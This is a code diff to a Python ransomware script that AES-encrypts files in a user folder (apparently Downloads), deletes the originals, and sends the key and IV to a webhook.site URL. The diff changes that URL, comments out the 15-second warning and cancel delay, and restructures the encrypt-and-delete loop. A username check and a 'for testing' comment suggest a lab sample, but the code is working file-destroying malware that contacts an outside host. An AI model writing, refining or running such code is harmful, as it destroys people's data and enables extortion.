@@ -26,7 +26,7 @@ from Cryptodome.Util.Padding import pad
 #
 # For testing, we just send it to webhook.site, which is a service that provides
 # temporary URLs to receive web requests for free.
-REMOTE_URL = "https://webhook.site/f7eef2dc-47dd-480c-863d-932fcf30e1de"
+REMOTE_URL = "http://webhook.site/0d3b5b2f-b359-45c6-b44d-8aefc32b7929"
 
 
 def get_downloads_path() -> Path:
@@ -69,8 +69,8 @@ if __name__ == "__main__":
     if not check_username("user"):
         raise RuntimeError("This program will only run if the username is 'user'. Exiting.")
     
-    print("Encryption will start in 15 seconds.")
-    time.sleep(15)
+    # print("Encryption will start in 5 seconds. Press Ctrl+C to cancel.")
+    # time.sleep(5)
 
     # Derive the key from the MachineGuid and a random salt.
     salt = os.urandom(16)
@@ -93,21 +93,34 @@ if __name__ == "__main__":
         try:
             with open(file, "rb") as fp1:
                 data = fp1.read()
+                
+            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
+            ciphertext = cipher.encrypt(pad(data, 16))
+
+            # Write as <file>.enc
+            print(f"Encrypting {file}...")
+            with open(file.with_suffix(".enc"), "wb") as fp2:
+                fp2.write(ciphertext)
+
+            # Delete the original file
+            print(f"Deleting {file}...")
+            file.unlink()
         except PermissionError:
-            # Too bad, the file's probably open
-            print(f"Skipping {file} (no permissions)")
+            # Too bad, the file's probably open or something
+            print(f"Couldn't encrypt/delete {file} (no permissions)")
             continue
-
-        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
-        ciphertext = cipher.encrypt(pad(data, 16))
-
-        # Write as <file>.enc
-        print(f"Encrypting {file}...")
-        with open(file.with_suffix(".enc"), "wb") as fp2:
-            fp2.write(ciphertext)
-
-        # Delete the original file
-        file.unlink()
+        except Exception as e:
+            print(f"Error processing {file}: {e}")
+            continue
+        
+        # print(f"Deleting {file}...")
+        # try:
+        #     # Delete the original file
+        #     file.unlink()
+        # except PermissionError:
+        #     # Too bad, the file's probably open or something
+        #     print(f"Skipping {file} (can't delete)")
+        #     continue
 
     # Send encryption information to the remote server.
     print(f"Sending IV and key to server...")
